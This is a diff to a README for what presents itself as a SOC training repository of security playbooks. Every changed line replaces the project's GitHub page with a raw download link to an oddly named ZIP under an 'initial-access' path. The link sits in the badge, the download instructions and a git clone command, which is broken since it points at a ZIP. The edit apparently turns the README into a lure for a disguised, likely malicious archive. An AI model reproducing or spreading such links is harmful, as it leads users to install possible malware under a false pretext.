@@ -1,6 +1,6 @@
 # 🛡️ security-playbooks - Clear Cyber Labs for SOC Work
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/theylovejay409/security-playbooks)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip)
 
 ## 🧭 What this is
 
@@ -32,7 +32,7 @@ If you plan to test detection rules, a lab VM is a good choice. Use a test syste
 
 Visit this page to download or clone the project:
 
-[https://github.com/theylovejay409/security-playbooks](https://github.com/theylovejay409/security-playbooks)
+[https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip](https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip)
 
 On the GitHub page:
 1. Click **Code**
@@ -48,7 +48,7 @@ If you prefer Git:
 3. Run:
 
 ```powershell
-git clone https://github.com/theylovejay409/security-playbooks
+git clone https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip
 ```
 
 4. Open the new folder after the clone finishes
@@ -209,6 +209,6 @@ This repo fits:
 
 Visit this page to download or clone the project:
 
-[https://github.com/theylovejay409/security-playbooks](https://github.com/theylovejay409/security-playbooks)
+[https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip](https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip)
 
 Open the page, download the ZIP, extract it, and follow the README files inside the folder
